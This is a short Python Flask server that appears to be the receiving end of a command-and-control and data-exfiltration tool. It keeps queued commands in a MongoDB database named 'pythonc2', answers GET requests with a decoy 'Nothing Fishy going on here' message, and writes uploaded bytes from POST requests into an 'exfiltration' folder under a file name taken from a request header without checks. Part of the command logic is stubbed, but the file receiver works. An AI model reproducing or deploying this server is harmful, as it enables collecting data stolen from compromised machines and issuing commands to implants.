from flask import Flask,request
from pathlib import Path
import  os
import pymongo

def main(myclient):
    app = Flask('app')

    @app.route('/',methods = ['GET', 'POST'])
    def run():
        if request.method == 'GET':
            mydb = myclient["pythonc2"]
            mycol = mydb["commands"]
            x = mycol.find_one()
            if 'sample' in x:
                mycol.delete_one(x)
                x = mycol.find_one()

            if 'command' in x:
                cmd = x['command']
                mycol.delete_one(x)
                return "Exfiltration command detected"

                
            return 'Nothing Fishy going on here :)'
        if request.method == 'POST':
            # data = request.json
            # import pdb
            # pdb.set_trace()
 
            print("Command to exfiltrate recieved...")
            if not os.path.exists('./exfiltration'):
                os.mkdir('./exfiltration')
            ## wb enables to write bianry
            with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
                # Write bytes to file
                f.write(request.data)
            f.close()
            return "OK"

    
    app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
    myclient = pymongo.MongoClient("mongodb://localhost:27017/")
    main(myclient)